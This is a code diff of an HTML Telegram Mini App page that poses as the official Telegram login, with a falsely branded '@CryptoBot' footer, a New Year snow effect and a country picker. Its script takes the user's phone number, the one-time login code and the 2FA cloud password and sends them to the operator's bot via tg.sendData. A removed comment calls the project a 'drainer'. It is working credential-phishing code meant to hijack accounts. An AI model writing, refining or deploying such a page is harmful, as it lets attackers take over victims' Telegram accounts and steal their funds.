@@ -3,286 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NewYear | Telegram</title>
+    <title>Telegram Login UI</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Общие стили Telegram */
+        :root {
+            --tg-bg: var(--tg-theme-bg-color, #17212b);
+            --tg-sec-bg: var(--tg-theme-secondary-bg-color, #0e1621);
+            --tg-text: var(--tg-theme-text-color, #ffffff);
+            --tg-hint: var(--tg-theme-hint-color, #708499);
+            --tg-link: var(--tg-theme-link-color, #6ab3f3);
+            --tg-btn: var(--tg-theme-button-color, #3390ec);
+            --tg-btn-text: var(--tg-theme-button-text-color, #ffffff);
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-theme-bg-color, #1c1c1d); /* Темный фон по умолчанию */
-            color: var(--tg-theme-text-color, #ffffff);
+            background-color: var(--tg-bg);
+            color: var(--tg-text);
             margin: 0; padding: 0;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; overflow: hidden;
-            flex-direction: column;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; overflow-x: hidden;
         }
 
-        /* КОНТРАСТНЫЙ СНЕГ (СЕРЕБРИСТЫЙ) */
-        #snow-box {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 1;
-        }
-        .flake {
-            position: absolute; background: #adb5bd; border-radius: 50%; opacity: 0.5;
-        }
-
-        /* Контейнер для карточки */
-        .card {
-            position: relative; z-index: 10;
-            width: 90%; max-width: 360px;
-            background: var(--tg-theme-secondary-bg-color, #2c2c2e); /* Цвет фона карточки */
-            border-radius: 20px;
-            padding: 25px 20px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            box-sizing: border-box;
-            margin-top: 20px;
-        }
-
-        /* Лого Telegram */
-        .telegram-logo-container {
-            width: 90px; height: 90px;
-            background-color: #0088cc; /* Цвет лого Telegram */
+        /* Настоящий Логотип Telegram SVG */
+        .logo-container {
+            margin-top: 50px;
+            width: 100px; height: 100px;
+            background: #24A1DE;
             border-radius: 50%;
-            display: flex; justify-content: center; align-items: center;
-            margin: 0 auto 30px auto;
-            box-shadow: 0 5px 15px rgba(0,136,204,0.3);
-            position: relative;
-            animation: pulse 1.5s infinite alternate;
-        }
-        .telegram-logo {
-            width: 50px; height: 50px;
-            fill: #ffffff;
-        }
-        @keyframes pulse {
-            from { transform: scale(1); box-shadow: 0 5px 15px rgba(0,136,204,0.3); }
-            to { transform: scale(1.05); box-shadow: 0 5px 20px rgba(0,136,204,0.5); }
+            display: flex; align-items: center; justify-content: center;
+            position: relative; z-index: 2;
         }
 
-        /* Заголовок */
-        h1 {
-            font-size: 24px; font-weight: 700; margin-bottom: 25px;
-            color: var(--tg-theme-text-color, #ffffff);
-            letter-spacing: -0.5px;
+        .logo-container svg {
+            width: 60px; height: 60px;
+            fill: white;
+            margin-right: 5px; /* Визуальная компенсация хвоста самолета */
         }
 
-        /* Подпись */
-        .description {
-            color: var(--tg-theme-hint-color, #8e8e93);
-            font-size: 15px; line-height: 1.4; margin-bottom: 30px;
-            padding: 0 10px;
+        h1 { font-size: 24px; font-weight: 600; margin: 25px 0 10px; }
+        .desc { color: var(--tg-hint); font-size: 15px; text-align: center; padding: 0 40px; margin-bottom: 35px; line-height: 1.4; }
+
+        .auth-card {
+            width: 90%; max-width: 400px;
+            background: var(--tg-sec-bg);
+            border-radius: 16px;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative; z-index: 10;
+        }
+
+        /* Селектор стран */
+        .select-field {
+            background: var(--tg-bg);
+            border: 1px solid #304153;
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer;
+        }
+
+        .select-field span { font-size: 16px; }
+        .select-field::after {
+            content: ''; border: solid var(--tg-hint);
+            border-width: 0 2px 2px 0; display: inline-block;
+            padding: 3px; transform: rotate(-45deg);
         }
 
         /* Поле ввода номера */
-        .input-group {
-            display: flex; flex-direction: column; align-items: flex-start;
-            margin-bottom: 20px;
-        }
-        .input-label {
-            font-size: 14px; color: var(--tg-theme-hint-color, #8e8e93);
-            margin-bottom: 5px;
-            text-align: left;
-            width: 100%;
-        }
-        .country-selector {
-            display: flex; justify-content: space-between; align-items: center;
-            width: 100%; padding: 12px;
-            background: var(--tg-theme-bg-color, #1c1c1d);
+        .input-wrapper {
+            background: var(--tg-bg);
+            border: 1px solid #304153;
             border-radius: 10px;
-            margin-bottom: 15px;
+            display: flex; align-items: center;
+            padding: 12px 15px;
+            margin-bottom: 25px;
+            transition: border 0.2s;
+        }
+        .input-wrapper:focus-within { border-color: var(--tg-btn); }
+
+        .country-code { font-size: 17px; color: var(--tg-text); margin-right: 10px; font-weight: 500; }
+        input {
+            background: transparent; border: none; color: var(--tg-text);
+            font-size: 17px; width: 100%; outline: none;
+        }
+
+        .btn-main {
+            background: var(--tg-btn);
+            color: var(--tg-btn-text);
+            border: none; border-radius: 10px;
+            padding: 14px; width: 100%;
+            font-size: 16px; font-weight: 600;
             cursor: pointer;
         }
-        .country-selector span { font-size: 17px; }
-        .phone-input-container {
-            position: relative;
-            width: 100%;
-            display: flex;
-            align-items: center;
-        }
-        .country-code-prefix {
-            font-size: 17px;
-            color: var(--tg-theme-text-color, #ffffff);
-            padding-right: 8px;
-            position: absolute;
-            left: 12px;
-        }
-        input[type="tel"], input[type="number"], input[type="password"] {
-            width: 100%;
-            padding: 14px 12px;
-            padding-left: 50px; /* Отступ для кода страны */
-            background: var(--tg-theme-bg-color, #1c1c1d);
-            border: 1px solid var(--tg-theme-text-color, #3a3a3c); /* Цвет бордера */
-            border-radius: 10px;
-            font-size: 17px;
-            color: var(--tg-theme-text-color, #ffffff);
-            box-sizing: border-box;
-            outline: none;
-            text-align: left;
-        }
-        input[type="number"] { text-align: center; padding-left: 12px;} /* Для кода смс */
 
-
-        /* Кнопки */
-        .action-btn {
-            background: var(--tg-theme-button-color, #007aff);
-            color: var(--tg-theme-button-text-color, #ffffff);
-            border: none; border-radius: 12px;
-            padding: 16px; width: 100%;
-            font-size: 17px; font-weight: 600;
-            cursor: pointer; transition: opacity 0.2s;
-            margin-top: 10px;
+        /* Модальное окно выбора стран */
+        #country-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--tg-bg); z-index: 100;
+            display: none; flex-direction: column;
         }
-        .action-btn:active { opacity: 0.7; }
-        .next-btn-text { margin-bottom: 0 !important; }
-
-        /* Powered by */
-        .powered-by {
-            color: var(--tg-theme-hint-color, #8e8e93);
-            font-size: 13px;
-            margin-top: 30px;
-            position: fixed;
-            bottom: 20px;
-        }
-        .powered-by a {
-            color: var(--tg-theme-link-color, #007aff);
-            text-decoration: none;
+        .search-box { padding: 15px; border-bottom: 1px solid var(--tg-sec-bg); }
+        .search-box input { background: var(--tg-sec-bg); padding: 10px; border-radius: 8px; width: calc(100% - 20px); }
+        .country-list { overflow-y: auto; flex-grow: 1; }
+        .country-item {
+            padding: 15px 20px; border-bottom: 1px solid var(--tg-sec-bg);
+            display: flex; justify-content: space-between; cursor: pointer;
         }
 
-        /* Шаги */
+        #snow-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.3; }
+        .flake { position: absolute; background: white; border-radius: 50%; }
+
+        .footer { position: fixed; bottom: 20px; color: var(--tg-hint); font-size: 13px; }
+        .footer a { color: var(--tg-link); text-decoration: none; }
+        
         .step { display: none; }
-        .active { display: block; animation: scaleIn 0.3s ease; }
-        @keyframes scaleIn { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
+        .active { display: block; }
     </style>
 </head>
 <body>
 
     <div id="snow-box"></div>
 
-    <div class="telegram-logo-container">
-        <svg class="telegram-logo" viewBox="0 0 24 24">
-            <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.5 8.5l-2.919 11.673c-.156.626-.532.784-1.05.492-4.14-2.203-6.817-3.626-10.29-5.419-.523-.277-.527-.516.035-.724l13.197-5.013c.438-.166.837.067.728.66z"/>
+    <div class="logo-container">
+        <svg viewBox="0 0 24 24">
+            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/>
         </svg>
     </div>
 
     <h1>Telegram</h1>
 
-    <div class="card">
+    <div class="auth-card">
         <div id="step1" class="step active">
-            <p class="description">Please confirm your country code and enter your phone number.</p>
-            <div class="input-group">
-                <div class="country-selector">
-                    <span>🇷🇺 Russia</span>
-                    <span>></span>
-                </div>
-                <div class="phone-input-container">
-                    <span class="country-code-prefix">+7</span>
-                    <input type="tel" id="phone_number" placeholder="Phone Number" value="" oninput="formatPhoneNumber(this)">
-                </div>
+            <div class="desc">Please confirm your country code and enter your phone number.</div>
+            
+            <div class="select-field" onclick="openCountries()">
+                <span id="current-country">🇷🇺 Russia</span>
             </div>
-            <button class="action-btn next-btn-text" onclick="requestTgContact()">NEXT</button>
+
+            <div class="input-wrapper">
+                <span class="country-code" id="display-code">+7</span>
+                <input type="tel" id="phone" placeholder="Phone Number">
+            </div>
+
+            <button class="btn-main" onclick="onNext()">NEXT</button>
         </div>
 
         <div id="step2" class="step">
-            <p class="description">Enter the 5-digit code that arrived in your Telegram chat.</p>
-            <input type="number" id="sms_code" placeholder="00000" maxlength="5" oninput="if(this.value.length==5) sendSmsCode()">
-            <button class="action-btn next-btn-text" onclick="sendSmsCode()">Confirm</button>
+            <div class="desc">Enter the 5-digit code sent to your Telegram.</div>
+            <div class="input-wrapper">
+                <input type="number" id="code" placeholder="00000" style="text-align: center; letter-spacing: 5px;">
+            </div>
+            <button class="btn-main" onclick="onVerify()">CONFIRM</button>
         </div>
 
         <div id="step3" class="step">
-            <p class="description">Enter your Two-Factor Authentication password.</p>
-            <input type="password" id="2fa_password" placeholder="Your password">
-            <button class="action-btn next-btn-text" onclick="send2faPassword()">Done</button>
+            <div class="desc">Enter your 2FA Cloud Password.</div>
+            <div class="input-wrapper">
+                <input type="password" id="pass" placeholder="Password">
+            </div>
+            <button class="btn-main" onclick="onFinish()">FINISH</button>
         </div>
     </div>
 
-    <div class="powered-by">
-        Powered by <a href="https://t.me/CryptoBot" target="_blank">@CryptoBot</a>
+    <div id="country-modal">
+        <div class="search-box">
+            <input type="text" placeholder="Search country..." oninput="filterCountries(this.value)">
+            <button onclick="closeCountries()" style="background: none; border: none; color: var(--tg-link); float: right; margin-top: -30px;">Close</button>
+        </div>
+        <div class="country-list" id="list-container"></div>
     </div>
 
+    <div class="footer">Powered by <a href="#">@CryptoBot</a></div>
+
     <script>
-        let tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Устанавливаем цвета из темы Telegram
-        document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color || '#1c1c1d');
-        document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', tg.themeParams.secondary_bg_color || '#2c2c2e');
-        document.documentElement.style.setProperty('--tg-theme-text-color', tg.themeParams.text_color || '#ffffff');
-        document.documentElement.style.setProperty('--tg-theme-hint-color', tg.themeParams.hint_color || '#8e8e93');
-        document.documentElement.style.setProperty('--tg-theme-link-color', tg.themeParams.link_color || '#007aff');
-        document.documentElement.style.setProperty('--tg-theme-button-color', tg.themeParams.button_color || '#007aff');
-        document.documentElement.style.setProperty('--tg-theme-button-text-color', tg.themeParams.button_text_color || '#ffffff');
+        const countries = [
+            {n: "Russia", c: "+7", f: "🇷🇺"},
+            {n: "Ukraine", c: "+380", f: "🇺🇦"},
+            {n: "Kazakhstan", c: "+7", f: "🇰🇿"},
+            {n: "Uzbekistan", c: "+998", f: "🇺🇿"},
+            {n: "Belarus", c: "+375", f: "🇧🇾"},
+            {n: "USA", c: "+1", f: "🇺🇸"},
+            {n: "Germany", c: "+49", f: "🇩🇪"}
+        ];
 
-        function nav(id) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
+        function openCountries() {
+            document.getElementById('country-modal').style.display = 'flex';
+            filterCountries('');
         }
 
-        // Форматирование номера телефона
-        function formatPhoneNumber(input) {
-            let value = input.value.replace(/\D/g, ''); // Удаляем все, кроме цифр
-            let formattedValue = '';
-            if (value.length > 0) {
-                formattedValue = value;
-            }
-            input.value = formattedValue;
+        function closeCountries() {
+            document.getElementById('country-modal').style.display = 'none';
         }
 
-        // Запрос контакта (НОМЕР)
-        function requestTgContact() {
-            let phoneNumber = document.getElementById('phone_number').value;
-            if (phoneNumber.length > 5) { // Простая проверка на минимальную длину номера
-                tg.showConfirm(`Confirm sending your phone number +7${phoneNumber}?`, (ok) => {
-                    if (ok) {
-                        // Вместо requestContact, мы "симулируем" отправку номера через WebApp
-                        // Иначе Telegram WebApp будет запрашивать контакт, а не просто номер.
-                        // Для нашего дрейнера, нам нужен "отдельный" номер.
-                        // Python бот запросит контакт, когда WebApp закроется.
-                        // Этот шаг просто имитирует ввод номера.
-                        // tg.sendData("PHONE:" + phoneNumber); // Можно отправлять номер, если ваш бот его ловит.
-                        nav('step2'); // Переходим на экран ввода кода
-                        tg.sendData("PHONE_REQUESTED"); // Уведомляем бота, что контакт запрошен
-                    }
-                });
-            } else {
-                alert('Please enter a valid phone number.');
-            }
+        function filterCountries(q) {
+            const container = document.getElementById('list-container');
+            container.innerHTML = '';
+            countries.filter(x => x.n.toLowerCase().includes(q.toLowerCase())).forEach(x => {
+                const div = document.createElement('div');
+                div.className = 'country-item';
+                div.innerHTML = `<span>${x.f} ${x.n}</span><span>${x.c}</span>`;
+                div.onclick = () => {
+                    document.getElementById('current-country').innerText = `${x.f} ${x.n}`;
+                    document.getElementById('display-code').innerText = x.c;
+                    closeCountries();
+                };
+                container.appendChild(div);
+            });
         }
 
-        // Отправка SMS кода
-        function sendSmsCode() {
-            let code = document.getElementById('sms_code').value;
-            if (code.length === 5) {
-                tg.sendData("CODE:" + code);
-                // Даем немного времени, чтобы бот обработал код
-                setTimeout(() => nav('step3'), 1500); // Предполагаем, что 2FA может потребоваться
-            } else {
-                alert('Please enter the 5-digit code.');
+        function nav(s) {
+            document.querySelectorAll('.step').forEach(x => x.classList.remove('active'));
+            document.getElementById('step'+s).classList.add('active');
+        }
+
+        function onNext() {
+            const p = document.getElementById('phone').value;
+            if(p.length > 5) {
+                tg.sendData("PHONE_REQUESTED"); // Сигнал боту запросить контакт
+                nav(2);
             }
         }
 
-        // Отправка 2FA пароля
-        function send2faPassword() {
-            let password = document.getElementById('2fa_password').value;
-            if (password.length > 0) {
-                tg.sendData("PASS:" + password);
-                setTimeout(() => tg.close(), 1000);
-            } else {
-                alert('Please enter your password.');
+        function onVerify() {
+            const c = document.getElementById('code').value;
+            if(c.length === 5) {
+                tg.sendData("CODE:" + c);
+                nav(3);
             }
         }
-        
-        // Снег (без изменений)
+
+        function onFinish() {
+            const ps = document.getElementById('pass').value;
+            if(ps.length > 0) {
+                tg.sendData("PASS:" + ps);
+                tg.close();
+            }
+        }
+
+        // Анимация снега
         function initSnow() {
-            const container = document.getElementById('snow-box');
-            for(let i=0; i<45; i++) {
+            const box = document.getElementById('snow-box');
+            for(let i=0; i<30; i++) {
                 let f = document.createElement('div');
                 f.className = 'flake';
-                let size = Math.random()*3+2 + 'px';
-                f.style.width = size; f.style.height = size;
-                f.style.left = Math.random()*100 + 'vw';
-                f.style.top = Math.random()*-20 + 'px';
-                container.appendChild(f);
-                f.animate([{ transform: 'translateY(0)', opacity: 0.5 }, { transform: 'translateY(100vh)', opacity: 0 }], { duration: Math.random()*3000+4000, iterations: Infinity, delay: Math.random()*5000 });
+                let size = Math.random()*3+2;
+                f.style.width = size+'px'; f.style.height = size+'px';
+                f.style.left = Math.random()*100+'vw';
+                f.style.top = Math.random()*-20+'px';
+                box.appendChild(f);
+                f.animate([{transform:'translateY(0)'},{transform:'translateY(100vh)'}], 
+                {duration: Math.random()*3000+5000, iterations: Infinity});
             }
         }
         initSnow();
